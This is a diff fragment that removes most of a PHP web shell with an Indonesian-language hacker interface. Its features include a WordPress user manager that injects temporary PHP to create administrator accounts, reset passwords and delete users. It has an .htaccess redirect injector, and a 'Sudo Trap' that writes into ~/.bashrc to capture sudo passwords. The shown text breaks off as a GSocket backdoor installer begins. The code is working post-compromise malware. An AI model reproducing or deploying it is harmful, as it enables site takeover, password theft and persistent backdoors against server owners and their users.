-    $default_dir = @realpath($_SERVER['DOCUMENT_ROOT']) ?: getcwd();
-    $today = date('Y-m-d'); $week_ago = date('Y-m-d', strtotime('-7 days'));
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Directory:</label>";
-    echo "<input type='text' id='searchDir' value='".htmlspecialchars($default_dir)."' style='width:100%;padding:10px;background:#111;color:#0f0;border:1px solid #333;border-radius:4px;box-sizing:border-box;'></div>";
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Date Range:</label>";
-    echo "<div style='display:flex;gap:10px;'>";
-    echo "<input type='date' id='dateFrom' value='{$week_ago}' style='flex:1;padding:8px;background:#111;color:#0f0;border:1px solid #333;border-radius:4px;'>";
-    echo "<input type='date' id='dateTo' value='{$today}' style='flex:1;padding:8px;background:#111;color:#0f0;border:1px solid #333;border-radius:4px;'></div>";
-    echo "<div style='margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;'>";
-    echo "<button type='button' onclick=\"setDateRange(1)\" style='padding:5px 10px;background:#222;color:#0f0;border:1px solid #333;border-radius:4px;cursor:pointer;font-size:11px;'>Today</button>";
-    echo "<button type='button' onclick=\"setDateRange(7)\" style='padding:5px 10px;background:#222;color:#0f0;border:1px solid #333;border-radius:4px;cursor:pointer;font-size:11px;'>7 Days</button>";
-    echo "<button type='button' onclick=\"setDateRange(30)\" style='padding:5px 10px;background:#222;color:#0f0;border:1px solid #333;border-radius:4px;cursor:pointer;font-size:11px;'>30 Days</button>";
-    echo "<button type='button' onclick=\"setDateRange(0)\" style='padding:5px 10px;background:#222;color:#f90;border:1px solid #333;border-radius:4px;cursor:pointer;font-size:11px;'>All</button></div></div>";
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Max Results:</label>";
-    echo "<select id='maxResults' style='width:100%;padding:10px;background:#111;color:#0f0;border:1px solid #333;border-radius:4px;'>";
-    echo "<option value='100'>100</option><option value='500'>500</option><option value='1000'>1000</option><option value='0' selected>Unlimited</option></select></div>";
-
-    echo "<button type='button' onclick='doSearch()' style='width:100%;padding:12px;background:#00aa00;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold;'>SCAN FILES</button>";
-
-    echo "<script>
-function setDateRange(d){var t=new Date();document.getElementById('dateTo').value=t.toISOString().split('T')[0];if(d===0){document.getElementById('dateFrom').value='';document.getElementById('dateTo').value='';}else{var f=new Date();f.setDate(f.getDate()-d+1);document.getElementById('dateFrom').value=f.toISOString().split('T')[0];}}
-function doSearch(){var fd=new FormData();fd.append('do_search','1');fd.append('search_dir',document.getElementById('searchDir').value);fd.append('date_from',document.getElementById('dateFrom').value);fd.append('date_to',document.getElementById('dateTo').value);fd.append('max_results',document.getElementById('maxResults').value);document.getElementById('ajaxContent').innerHTML='<p style=\"color:#ff0;padding:50px;text-align:center;\">Scanning...</p>';fetch('?find_modified=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{document.getElementById('ajaxContent').innerHTML=h;var sc=document.getElementById('ajaxContent').querySelectorAll('script');for(var i=0;i<sc.length;i++){var ns=document.createElement('script');ns.textContent=sc[i].textContent;document.head.appendChild(ns);}});}
-</script></div>";
-    exit;
-}
-
-// ===== WORDPRESS USER MANAGER =====
-if (isset($_GET['wp_adduser']) && isset($_GET['ajax'])) {
-    header('Content-Type: text/html; charset=utf-8');
-
-    // Detect WordPress paths
-    $detected_paths = [];
-    $search_paths = [$_SERVER['DOCUMENT_ROOT'], dirname($_SERVER['DOCUMENT_ROOT']), '/home/' . get_current_user() . '/public_html'];
-    foreach ($search_paths as $base) {
-        if (@file_exists($base . '/wp-config.php')) $detected_paths[] = $base;
-        $dirs = @scandir($base);
-        if ($dirs) {
-            foreach ($dirs as $dir) {
-                if ($dir === '.' || $dir === '..') continue;
-                $check = $base . '/' . $dir;
-                if (@is_dir($check) && @file_exists($check . '/wp-config.php')) $detected_paths[] = $check;
-            }
-        }
-    }
-    $detected_paths = array_unique($detected_paths);
-    $default_wp_path = !empty($detected_paths) ? $detected_paths[0] : ($_SERVER['DOCUMENT_ROOT'] ?? '');
-
-    function executeWpScript($wp_path, $script_code) {
-        $wp_path = rtrim($wp_path, '/');
-        if (!@is_dir($wp_path) || !@file_exists($wp_path . '/wp-config.php') || !@is_writable($wp_path)) return "ERROR:Path tidak valid";
-        $script_path = $wp_path . '/.wp-tmp-' . substr(md5(time() . rand()), 0, 8) . '.php';
-        $full_script = '<?php @error_reporting(0); define("WP_USE_THEMES", false); define("ABSPATH", dirname(__FILE__) . "/");
-try { if (file_exists("wp-load.php")) { require("wp-load.php"); } elseif (file_exists("wp-config.php")) { require("wp-config.php"); if (file_exists(ABSPATH . "wp-settings.php")) { require(ABSPATH . "wp-settings.php"); } } else { echo "ERROR:WP not found"; @unlink(__FILE__); exit; } } catch (Exception $e) { echo "ERROR:" . $e->getMessage(); @unlink(__FILE__); exit; }
-' . $script_code . ' @unlink(__FILE__); ?>';
-        if (@file_put_contents($script_path, $full_script) === false) return "ERROR:Cannot write script";
-        $old_cwd = getcwd();
-        try {
-            @chdir($wp_path); ob_start(); @include($script_path); $result = ob_get_clean(); @chdir($old_cwd);
-            if (@file_exists($script_path)) @unlink($script_path);
-            return empty(trim($result)) ? "ERROR:WP tidak merespons" : $result;
-        } catch (Exception $e) { @chdir($old_cwd); @unlink($script_path); return "ERROR:" . $e->getMessage(); }
-    }
-
-    $wp_message = '';
-
-    // Handle delete user
-    if (isset($_POST['delete_wp_user'])) {
-        $wp_path = trim($_POST['wp_path']); $user_id = intval($_POST['user_id']);
-        if (!empty($wp_path) && $user_id > 0) {
-            $result = executeWpScript($wp_path, 'if (!function_exists("wp_delete_user")) { require_once(ABSPATH . "wp-admin/includes/user.php"); } $u = get_user_by("id", '.$user_id.'); if ($u) { wp_delete_user('.$user_id.', 1); echo "DELETE_SUCCESS"; } else { echo "ERROR:User not found"; }');
-            if (trim($result) === "DELETE_SUCCESS") { $wp_message = "<div style='background:#1a3a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#0f0;'>User ID {$user_id} berhasil dihapus!</div>"; $_POST['list_wp_users'] = '1'; }
-            else { $wp_message = "<div style='background:#3a1a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#f44;'>Gagal: " . htmlspecialchars($result) . "</div>"; }
-        }
-    }
-
-    // Handle reset password
-    if (isset($_POST['reset_wp_password'])) {
-        $wp_path = trim($_POST['wp_path']); $user_id = intval($_POST['user_id']); $new_password = trim($_POST['new_password']);
-        if (!empty($wp_path) && $user_id > 0 && !empty($new_password)) {
-            $result = executeWpScript($wp_path, '$u = get_user_by("id", '.$user_id.'); if ($u) { wp_set_password("'.addslashes($new_password).'", '.$user_id.'); echo "RESET_SUCCESS"; } else { echo "ERROR:User not found"; }');
-            if (trim($result) === "RESET_SUCCESS") { $wp_message = "<div style='background:#1a3a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#0f0;'>Password berhasil direset!<br><span style='color:#ff0;'>New: " . htmlspecialchars($new_password) . "</span></div>"; $_POST['list_wp_users'] = '1'; }
-            else { $wp_message = "<div style='background:#3a1a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#f44;'>Gagal: " . htmlspecialchars($result) . "</div>"; }
-        }
-    }
-
-    // Handle create user
-    if (isset($_POST['create_wp_user'])) {
-        $wp_path = trim($_POST['wp_path']); $username = trim($_POST['username']); $password = trim($_POST['password']); $email = trim($_POST['email']); $role = $_POST['role'] ?? 'administrator';
-        if (empty($wp_path) || empty($username) || empty($password) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
-            $wp_message = "<div style='background:#3a1a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#f44;'>Data tidak lengkap/valid</div>";
-        } else {
-            $result = executeWpScript($wp_path, '$u="'.addslashes($username).'";$p="'.addslashes($password).'";$e="'.addslashes($email).'";$r="'.addslashes($role).'"; if(!username_exists($u)&&!email_exists($e)){$id=wp_create_user($u,$p,$e);if(!is_wp_error($id)){$wu=new WP_User($id);$wu->set_role($r);echo "SUCCESS";}else{echo "ERROR:".$id->get_error_message();}}else{echo "EXISTS";}');
-            if (trim($result) === "SUCCESS") { $wp_message = "<div style='background:#1a3a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#0f0;'>User <b>".htmlspecialchars($username)."</b> berhasil dibuat!<br><span style='color:#ff0;'>Password: ".htmlspecialchars($password)."</span></div>"; $_POST['list_wp_users'] = '1'; }
-            elseif (trim($result) === "EXISTS") { $wp_message = "<div style='background:#2a2a0a;padding:8px;border-radius:4px;margin-bottom:10px;color:#ff0;'>Username/email sudah ada!</div>"; }
-            else { $wp_message = "<div style='background:#3a1a1a;padding:8px;border-radius:4px;margin-bottom:10px;color:#f44;'>Gagal: " . htmlspecialchars($result) . "</div>"; }
-        }
-    }
-
-    // List users
-    $wp_users_list = '';
-    $should_list = isset($_POST['list_wp_users']) || isset($_POST['delete_wp_user']) || isset($_POST['create_wp_user']) || isset($_POST['reset_wp_password']);
-    if (!$should_list && !empty($default_wp_path) && @file_exists($default_wp_path . '/wp-config.php')) $should_list = true;
-
-    if ($should_list) {
-        $wp_path = isset($_POST['wp_path']) && !empty(trim($_POST['wp_path'])) ? trim($_POST['wp_path']) : $default_wp_path;
-        if (!empty($wp_path) && @file_exists($wp_path . '/wp-config.php')) {
-            $result = executeWpScript($wp_path, '$users=get_users(array("orderby"=>"ID","order"=>"ASC"));$d=array();foreach($users as $u){$d[]=array("id"=>$u->ID,"login"=>$u->user_login,"email"=>$u->user_email,"role"=>implode(", ",$u->roles));}echo "USERLIST:".json_encode($d);');
-            if (strpos($result, "USERLIST:") === 0) {
-                $users = json_decode(substr($result, 9), true);
-                if (!empty($users)) {
-                    $wp_users_list .= "<div style='margin-top:15px;padding:10px;background:#111;border-radius:6px;'><h4 style='color:#0f0;margin:0 0 8px 0;'>User List (".count($users).")</h4>";
-                    $wp_users_list .= "<div style='overflow-x:auto;max-height:180px;overflow-y:auto;'><table style='width:100%;border-collapse:collapse;font-size:10px;'>";
-                    $wp_users_list .= "<tr style='background:#1a1a1a;'><th style='padding:5px;border:1px solid #333;color:#0f0;'>ID</th><th style='padding:5px;border:1px solid #333;color:#0f0;'>Username</th><th style='padding:5px;border:1px solid #333;color:#0f0;'>Email</th><th style='padding:5px;border:1px solid #333;color:#0f0;'>Role</th><th style='padding:5px;border:1px solid #333;color:#0f0;'>Action</th></tr>";
-                    foreach ($users as $u) {
-                        $role_color = ($u['role'] === 'administrator') ? '#f90' : '#888';
-                        $wp_users_list .= "<tr><td style='padding:4px;border:1px solid #333;color:#fff;text-align:center;'>".$u['id']."</td>";
-                        $wp_users_list .= "<td style='padding:4px;border:1px solid #333;color:#4af;'>".htmlspecialchars($u['login'])."</td>";
-                        $wp_users_list .= "<td style='padding:4px;border:1px solid #333;color:#888;font-size:9px;'>".htmlspecialchars($u['email'])."</td>";
-                        $wp_users_list .= "<td style='padding:4px;border:1px solid #333;color:{$role_color};'>".htmlspecialchars($u['role'])."</td>";
-                        $wp_users_list .= "<td style='padding:4px;border:1px solid #333;text-align:center;'>";
-                        $wp_users_list .= "<button type='button' onclick=\"resetWpPassword('".htmlspecialchars($wp_path)."',".$u['id'].",'".htmlspecialchars($u['login'])."');\" style='padding:2px 6px;background:#0066aa;color:#fff;border:none;border-radius:3px;cursor:pointer;font-size:9px;margin-right:3px;'>Reset</button>";
-                        if ($u['id'] != 1) { $wp_users_list .= "<button type='button' onclick=\"if(confirm('Hapus user ".htmlspecialchars($u['login'])."?'))deleteWpUser('".htmlspecialchars($wp_path)."',".$u['id'].");\" style='padding:2px 6px;background:#aa0000;color:#fff;border:none;border-radius:3px;cursor:pointer;font-size:9px;'>Del</button>"; }
-                        $wp_users_list .= "</td></tr>";
-                    }
-                    $wp_users_list .= "</table></div></div>";
-                }
-            }
-        }
-    }
-
-    echo "<h3>WordPress User Manager</h3><div style='padding:15px;background:#0a0a0a;border-radius:8px;'>";
-    echo $wp_message;
-
-    echo "<form id='wpUserForm' method='post'>";
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>WordPress Path:</label>";
-    echo "<input type='text' name='wp_path' value='".htmlspecialchars($_POST['wp_path'] ?? $default_wp_path)."' style='width:100%;padding:10px;background:#111;color:#0f0;border:1px solid #333;border-radius:4px;box-sizing:border-box;'>";
-    if (!empty($detected_paths)) {
-        echo "<div style='margin-top:5px;'><small style='color:#888;'>Detected: </small>";
-        foreach ($detected_paths as $dp) { echo "<small style='color:#4af;cursor:pointer;margin-right:8px;' onclick=\"this.closest('form').querySelector('input[name=wp_path]').value='".htmlspecialchars($dp)."'\">[".htmlspecialchars(basename($dp))."]</small>"; }
-        echo "</div>";
-    }
-    echo "</div>";
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Username:</label>";
-    echo "<input type='text' name='username' placeholder='newadmin' style='width:100%;padding:10px;background:#111;color:#fff;border:1px solid #333;border-radius:4px;box-sizing:border-box;'></div>";
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Password:</label>";
-    echo "<div style='display:flex;gap:8px;'><input type='text' name='password' id='wpPassword' placeholder='password123' style='flex:1;padding:10px;background:#111;color:#ff0;border:1px solid #333;border-radius:4px;'>";
-    echo "<button type='button' onclick=\"document.getElementById('wpPassword').value=Math.random().toString(36).slice(-8)+Math.random().toString(36).slice(-4).toUpperCase()+'!'\" style='padding:10px 15px;background:#333;color:#fff;border:1px solid #555;border-radius:4px;cursor:pointer;'>Random</button></div></div>";
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Email:</label>";
-    echo "<input type='email' name='email' placeholder='admin@example.com' style='width:100%;padding:10px;background:#111;color:#4af;border:1px solid #333;border-radius:4px;box-sizing:border-box;'></div>";
-
-    echo "<div style='margin-bottom:15px;'><label style='color:#0f0;display:block;margin-bottom:5px;'>Role:</label>";
-    echo "<select name='role' style='width:100%;padding:10px;background:#111;color:#f90;border:1px solid #333;border-radius:4px;'>";
-    echo "<option value='administrator' selected>Administrator</option><option value='editor'>Editor</option><option value='author'>Author</option><option value='subscriber'>Subscriber</option></select></div>";
-
-    echo "<button type='button' onclick='createWpUser()' style='width:100%;padding:12px;background:#00aa00;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold;'>Create User</button>";
-    echo "</form>";
-
-    echo $wp_users_list;
-
-    echo "<script>
-function createWpUser(){
-    var fd=new FormData(document.getElementById('wpUserForm'));
-    fd.append('create_wp_user','1');
-    document.getElementById('ajaxContent').innerHTML='<p style=\"color:#0f0;padding:50px;text-align:center;\">Creating user...</p>';
-    fetch('?wp_adduser=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{
-        document.getElementById('ajaxContent').innerHTML=h;
-        var sc=document.getElementById('ajaxContent').querySelectorAll('script');
-        for(var i=0;i<sc.length;i++){var ns=document.createElement('script');ns.textContent=sc[i].textContent;document.head.appendChild(ns);}
-    });
-}
-function deleteWpUser(p,id){var fd=new FormData();fd.append('wp_path',p);fd.append('user_id',id);fd.append('delete_wp_user','1');document.getElementById('ajaxContent').innerHTML='<p style=\"color:#f44;padding:50px;text-align:center;\">Deleting...</p>';fetch('?wp_adduser=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{document.getElementById('ajaxContent').innerHTML=h;var sc=document.getElementById('ajaxContent').querySelectorAll('script');for(var i=0;i<sc.length;i++){var ns=document.createElement('script');ns.textContent=sc[i].textContent;document.head.appendChild(ns);}});}
-function resetWpPassword(p,id,u){var np=prompt('Password baru untuk '+u+':',Math.random().toString(36).slice(-8)+Math.random().toString(36).slice(-4).toUpperCase()+'!');if(!np)return;var fd=new FormData();fd.append('wp_path',p);fd.append('user_id',id);fd.append('new_password',np);fd.append('reset_wp_password','1');document.getElementById('ajaxContent').innerHTML='<p style=\"color:#4af;padding:50px;text-align:center;\">Resetting...</p>';fetch('?wp_adduser=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{document.getElementById('ajaxContent').innerHTML=h;var sc=document.getElementById('ajaxContent').querySelectorAll('script');for(var i=0;i<sc.length;i++){var ns=document.createElement('script');ns.textContent=sc[i].textContent;document.head.appendChild(ns);}});}
-</script></div>";
-    exit;
-}
-
-// ===== REDIRECT MANAGER =====
-if (isset($_GET['redirect_manager']) && isset($_GET['ajax'])) {
-    header('Content-Type: text/html; charset=utf-8');
-
-    $htaccess_paths = [$_SERVER['DOCUMENT_ROOT'] . '/.htaccess', dirname(__FILE__) . '/.htaccess'];
-    $htaccess_file = '';
-    foreach ($htaccess_paths as $path) { if (@file_exists($path) || @is_writable(dirname($path))) { $htaccess_file = $path; break; } }
-    if (empty($htaccess_file)) $htaccess_file = dirname(__FILE__) . '/.htaccess';
-
-    function parseRedirects($htaccess_file) {
-        $redirects = [];
-        if (@file_exists($htaccess_file)) {
-            $content = @file_get_contents($htaccess_file);
-            preg_match_all('/(# Redirect: ([^\n]+) -> ([^\n]+)\nRewriteEngine On\n(?:RewriteCond [^\n]+\n)?RewriteRule\s+\^[^\s]+\s+[^\s]+\s+\[R=(\d+),L\]\n?)/si', $content, $matches, PREG_SET_ORDER);
-            foreach ($matches as $m) { $redirects[] = ['type'=>'domain','code'=>$m[4],'source'=>$m[2]?:'(all)','destination'=>$m[3],'raw'=>$m[1]]; }
-            preg_match_all('/^(Redirect(?:Match)?)\s+(301|302|temp|permanent)?\s*["\']?([^\s"\']+)["\']?\s+["\']?([^\s"\']+)["\']?/mi', $content, $matches, PREG_SET_ORDER);
-            foreach ($matches as $m) { $code = $m[2] ?: '302'; if ($code == 'permanent') $code = '301'; if ($code == 'temp') $code = '302'; $redirects[] = ['type'=>strtolower($m[1]),'code'=>$code,'source'=>$m[3],'destination'=>$m[4],'raw'=>$m[0]]; }
-        }
-        return $redirects;
-    }
-
-    // Add redirect
-    if (isset($_POST['add_domain_redirect'])) {
-        $from_url = trim($_POST['from_domain']); $to_url = trim($_POST['to_domain']); $code = $_POST['code'] ?: '301';
-        if (!empty($to_url)) {
-            $content = @file_get_contents($htaccess_file) ?: '';
-            $from_host = ''; $from_path = '';
-            if (!empty($from_url)) { $fp = parse_url($from_url); $from_host = isset($fp['host']) ? $fp['host'] : $from_url; $from_host = preg_replace('/^www\./', '', $from_host); $from_path = isset($fp['path']) ? trim($fp['path'], '/') : ''; }
-            $tp = parse_url($to_url); $to_scheme = isset($tp['scheme']) ? $tp['scheme'] : 'https'; $to_host = isset($tp['host']) ? $tp['host'] : $to_url; $to_path = isset($tp['path']) ? rtrim($tp['path'], '/') : ''; $to_base = "{$to_scheme}://{$to_host}{$to_path}";
-            $rules = "\n\n# Redirect: {$from_url} -> {$to_url}\nRewriteEngine On\n";
-            if (!empty($from_host)) $rules .= "RewriteCond %{HTTP_HOST} ^(www\\.)?{$from_host}$ [NC]\n";
-            $rules .= !empty($from_path) ? "RewriteRule ^{$from_path}(/.*)?$ {$to_base}\$1 [R={$code},L]\n" : "RewriteRule ^(.*)$ {$to_base}/\$1 [R={$code},L]\n";
-            $content .= $rules;
-            @file_put_contents($htaccess_file, $content);
-            echo "<div style='background:#1a3a1a;padding:10px;border-radius:4px;margin-bottom:15px;color:#0f0;'>Redirect berhasil ditambahkan!</div>";
-        }
-    }
-
-    // Delete redirect
-    if (isset($_POST['delete_redirect'])) {
-        $idx = intval($_POST['delete_index']); $content = @file_get_contents($htaccess_file);
-        if ($content !== false) {
-            $redirects = parseRedirects($htaccess_file);
-            if (isset($redirects[$idx])) {
-                $content = str_replace($redirects[$idx]['raw'], '', $content);
-                $content = preg_replace("/\n{3,}/", "\n\n", trim($content));
-                @file_put_contents($htaccess_file, $content);
-                echo "<div style='background:#1a3a1a;padding:10px;border-radius:4px;margin-bottom:15px;color:#0f0;'>Redirect berhasil dihapus!</div>";
-            }
-        }
-    }
-
-    $redirects = parseRedirects($htaccess_file);
-
-    echo "<h3>🔀 Redirect Manager</h3><div style='padding:15px;background:#0a0a0a;border-radius:8px;'>";
-
-    echo "<div style='margin-bottom:20px;padding:15px;background:#111;border-radius:6px;'>";
-    echo "<h4 style='color:#0f0;margin:0 0 12px 0;'>Add Domain Redirect</h4>";
-    echo "<form id='redirectForm'>";
-    echo "<div style='margin-bottom:10px;'><label style='color:#888;font-size:11px;'>From (optional):</label>";
-    echo "<input type='text' name='from_domain' id='fromDomain' placeholder='https://old-domain.com' style='width:100%;padding:10px;background:#0a0a0a;color:#ff0;border:1px solid #333;border-radius:4px;box-sizing:border-box;'></div>";
-    echo "<div style='text-align:center;padding:5px 0;color:#0f0;'>↓</div>";
-    echo "<div style='margin-bottom:10px;'><label style='color:#888;font-size:11px;'>To (required):</label>";
-    echo "<input type='text' name='to_domain' id='toDomain' placeholder='https://new-domain.com' required style='width:100%;padding:10px;background:#0a0a0a;color:#0f0;border:1px solid #333;border-radius:4px;box-sizing:border-box;'></div>";
-    echo "<div style='margin-bottom:12px;display:flex;gap:10px;'><label style='color:#f90;cursor:pointer;'><input type='radio' name='code' value='301' checked> 301 Permanent</label>";
-    echo "<label style='color:#4af;cursor:pointer;'><input type='radio' name='code' value='302'> 302 Temporary</label></div>";
-    echo "<button type='button' onclick='addRedirect()' style='width:100%;padding:12px;background:#00aa00;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold;'>Add Redirect</button>";
-    echo "</form></div>";
-
-    echo "<h4 style='color:#0f0;margin:0 0 10px 0;'>Active Redirects (".count($redirects).")</h4>";
-    if (empty($redirects)) { echo "<div style='padding:20px;background:#111;border-radius:4px;text-align:center;color:#666;'>No redirects found.</div>"; }
-    else {
-        echo "<div style='background:#111;border-radius:6px;overflow:hidden;'><table style='width:100%;border-collapse:collapse;font-size:11px;'>";
-        echo "<tr style='background:#1a1a1a;'><th style='padding:8px;border:1px solid #333;color:#0f0;width:50px;'>Code</th><th style='padding:8px;border:1px solid #333;color:#0f0;'>From</th><th style='padding:8px;border:1px solid #333;color:#0f0;width:30px;'>→</th><th style='padding:8px;border:1px solid #333;color:#0f0;'>To</th><th style='padding:8px;border:1px solid #333;color:#0f0;width:50px;'>Del</th></tr>";
-        foreach ($redirects as $idx => $rd) {
-            $cc = $rd['code'] == '301' ? '#f90' : '#4af';
-            echo "<tr><td style='padding:6px;border:1px solid #333;color:{$cc};text-align:center;font-weight:bold;'>{$rd['code']}</td>";
-            echo "<td style='padding:6px;border:1px solid #333;color:#ff0;word-break:break-all;'>".htmlspecialchars($rd['source'])."</td>";
-            echo "<td style='padding:6px;border:1px solid #333;color:#666;text-align:center;'>→</td>";
-            echo "<td style='padding:6px;border:1px solid #333;color:#0f0;word-break:break-all;'>".htmlspecialchars($rd['destination'])."</td>";
-            echo "<td style='padding:6px;border:1px solid #333;text-align:center;'><button type='button' onclick=\"deleteRedirect({$idx})\" style='padding:4px 8px;background:#aa0000;color:#fff;border:none;border-radius:3px;cursor:pointer;'>X</button></td></tr>";
-        }
-        echo "</table></div>";
-    }
-    echo "<p style='margin-top:10px;color:#666;font-size:10px;'>File: ".htmlspecialchars($htaccess_file)."</p>";
-    echo "</div>";
-
-    echo "<script>
-function addRedirect(){
-    var fd=new FormData(document.getElementById('redirectForm'));
-    fd.append('add_domain_redirect','1');
-    if(!document.getElementById('toDomain').value){alert('To domain is required!');return;}
-    document.getElementById('ajaxContent').innerHTML='<p style=\"color:#0f0;padding:50px;text-align:center;\">Adding redirect...</p>';
-    fetch('?redirect_manager=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{
-        document.getElementById('ajaxContent').innerHTML=h;
-        var sc=document.getElementById('ajaxContent').querySelectorAll('script');
-        for(var i=0;i<sc.length;i++){var ns=document.createElement('script');ns.textContent=sc[i].textContent;document.head.appendChild(ns);}
-    });
-}
-function deleteRedirect(idx){
-    if(!confirm('Delete this redirect?'))return;
-    var fd=new FormData();
-    fd.append('delete_redirect','1');
-    fd.append('delete_index',idx);
-    document.getElementById('ajaxContent').innerHTML='<p style=\"color:#f44;padding:50px;text-align:center;\">Deleting...</p>';
-    fetch('?redirect_manager=1&ajax=1',{method:'POST',body:fd}).then(r=>r.text()).then(h=>{
-        document.getElementById('ajaxContent').innerHTML=h;
-        var sc=document.getElementById('ajaxContent').querySelectorAll('script');
-        for(var i=0;i<sc.length;i++){var ns=document.createElement('script');ns.textContent=sc[i].textContent;document.head.appendChild(ns);}
-    });
-}
-</script>";
-    exit;
-}
-
-// ===== SUDO TRAP =====
-if (isset($_GET['sudo_trap']) && isset($_GET['ajax'])) {
-    echo "<h3>🪤 Sudo Trap</h3>";
-    echo "<div style='padding: 15px; background: #111; border-radius: 8px;'>";
-
-    $trap_script = __DIR__ . '/sudotrap.sh';
-    $home_dir = getenv('HOME') ?: (isset($_SERVER['HOME']) ? $_SERVER['HOME'] : posix_getpwuid(posix_getuid())['dir']);
-    $bashrc_path = $home_dir . '/.bashrc';
-
-    // Check if script exists
-    if (!@file_exists($trap_script)) {
-        echo "<p style='color: #ff5555;'>❌ File sudotrap.sh tidak ditemukan!</p>";
-        echo "</div>";
-        exit;
-    }
-
-    $trap_content = @file_get_contents($trap_script);
-    $bashrc_content = @file_get_contents($bashrc_path) ?: '';
-    $is_installed = (strpos($bashrc_content, '# SUDO TRAP START') !== false);
-
-    // Action: Install
-    if (isset($_GET['action']) && $_GET['action'] === 'install') {
-        if ($is_installed) {
-            echo "<p style='color: #ffcc00;'>⚠️ Sudo Trap sudah terinstall di .bashrc</p>";
-        } else {
-            echo "<p style='color: #888;'>Menginstall Sudo Trap ke .bashrc...</p>";
-            echo "<pre style='background: #000; padding: 10px; border-radius: 4px; font-size: 11px; color: #0f0; max-height: 200px; overflow-y: auto;'>";
-            echo "Target: $bashrc_path\n";
-            echo "Source: $trap_script\n";
-            echo "---\n";
-
-            $install_content = "\n\n# SUDO TRAP START\n" . $trap_content . "\n# SUDO TRAP END\n";
-            if (@file_put_contents($bashrc_path, $bashrc_content . $install_content)) {
-                echo "✓ Menulis ke .bashrc... OK\n";
-                echo "✓ Sudo Trap berhasil diinstall!\n";
-                echo "</pre>";
-                echo "<p style='color: #00ff00; margin-top: 10px;'>✅ Instalasi selesai!</p>";
-                echo "<p style='color: #888;'>Trap akan aktif pada session terminal baru.</p>";
-            } else {
-                echo "✗ Gagal menulis ke .bashrc\n";
-                echo "</pre>";
-                echo "<p style='color: #ff5555; margin-top: 10px;'>❌ Instalasi gagal!</p>";
-            }
-        }
-        echo "<button onclick=\"openModalWithURL('?sudo_trap=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        echo "</div>";
-        exit;
-    }
-
-    // Action: Uninstall
-    if (isset($_GET['action']) && $_GET['action'] === 'uninstall') {
-        if (!$is_installed) {
-            echo "<p style='color: #ffcc00;'>⚠️ Sudo Trap tidak ditemukan di .bashrc</p>";
-        } else {
-            echo "<p style='color: #888;'>Menghapus Sudo Trap dari .bashrc...</p>";
-            echo "<pre style='background: #000; padding: 10px; border-radius: 4px; font-size: 11px; color: #0f0; max-height: 200px; overflow-y: auto;'>";
-            echo "Target: $bashrc_path\n";
-            echo "---\n";
-
-            $new_content = preg_replace('/\n*# SUDO TRAP START\n.*?\n# SUDO TRAP END\n*/s', '', $bashrc_content);
-            if (@file_put_contents($bashrc_path, $new_content)) {
-                echo "✓ Menghapus dari .bashrc... OK\n";
-                echo "✓ Sudo Trap berhasil dihapus!\n";
-                echo "</pre>";
-                echo "<p style='color: #00ff00; margin-top: 10px;'>✅ Uninstall selesai!</p>";
-            } else {
-                echo "✗ Gagal menghapus dari .bashrc\n";
-                echo "</pre>";
-                echo "<p style='color: #ff5555; margin-top: 10px;'>❌ Uninstall gagal!</p>";
-            }
-        }
-        echo "<button onclick=\"openModalWithURL('?sudo_trap=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        echo "</div>";
-        exit;
-    }
-
-    // Default: Show menu with status
-    if ($is_installed) {
-        echo "<p style='color: #00ff00; margin-bottom: 15px;'>● Status: <b>INSTALLED</b></p>";
-        echo "<button onclick=\"openModalWithURL('?sudo_trap=1&ajax=1&action=uninstall')\" style='padding: 12px 20px; background: #aa0000; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%;'>";
-        echo "🗑️ <b>Uninstall Trap</b>";
-        echo "</button>";
-    } else {
-        echo "<p style='color: #888; margin-bottom: 15px;'>○ Status: <b>NOT INSTALLED</b></p>";
-        echo "<p style='color: #aaa; margin-bottom: 15px;'>Inject sudo trap ke .bashrc untuk capture password.</p>";
-        echo "<button onclick=\"openModalWithURL('?sudo_trap=1&ajax=1&action=install')\" style='padding: 12px 20px; background: #00aa00; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%;'>";
-        echo "🚀 <b>Install Trap</b>";
-        echo "</button>";
-    }
-
-    echo "</div>";
-    exit;
-}
-
-// ===== GSOCKET INSTALL =====
-if (isset($_GET['gsocket_install']) && isset($_GET['ajax'])) {
-    echo "<h3>🔌 GSocket Install</h3>";
-    echo "<div style='padding: 15px; background: #111; border-radius: 8px;'>";
-
-    // Action: Install
-    if (isset($_GET['action']) && $_GET['action'] === 'install') {
-        echo "<p style='color: #888;'>Menjalankan instalasi GSocket...</p>";
